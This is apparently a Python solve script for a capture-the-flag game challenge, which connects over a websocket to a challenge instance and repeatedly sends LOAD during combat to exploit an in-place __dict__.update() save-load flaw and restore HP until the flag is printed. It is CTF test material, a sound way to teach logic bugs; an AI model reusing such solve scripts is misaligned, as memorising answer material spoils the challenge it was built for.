#!/usr/bin/env python3
"""
Solve script for Dragon's Lair CTF challenge

The vulnerability: When you SAVE and then LOAD during combat, the game uses
__dict__.update() which modifies the existing Player object in-place. This means
the combat loop continues running with the same object reference, but we can
restore our HP mid-fight by loading a save from before we took damage.

Strategy:
1. SAVE at full HP
2. Start FIGHT
3. Spam LOAD to keep restoring HP while combat continues
4. Eventually dragon dies and we get the flag
"""

import asyncio
import websockets

TARGET = "wss://be-a-legend-c2815d87b3b7fe86.instancer.batmans.kitchen/ws"

async def exploit():
    async with websockets.connect(TARGET) as ws:
        print("Connected to server")
        
        msg = await ws.recv()
        print(msg)
        
        print("\n[+] Saving game at full HP...")
        await ws.send("SAVE")
        msg = await ws.recv()
        print(msg)
        
        print("[+] Starting combat...")
        await ws.send("FIGHT")
        
        print("[+] Spamming LOAD to restore HP during combat...")
        
        try:
            while True:
                # Send LOAD command repeatedly
                await ws.send("LOAD")
                
                # Read messages
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=0.05)

                    if "Game loaded" not in msg:
                        print(msg)
                    
                    # Check if we got the flag
                    if "bkctf{" in msg:
                        for _ in range(5):
                            try:
                                msg = await asyncio.wait_for(ws.recv(), timeout=0.1)
                                print(msg)
                            except asyncio.TimeoutError:
                                break
                        break
                    
                    if "You have died" in msg:
                        break
                        
                except asyncio.TimeoutError:
                    pass
                
                await asyncio.sleep(0.05)
                
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")

if __name__ == "__main__":
    asyncio.run(exploit())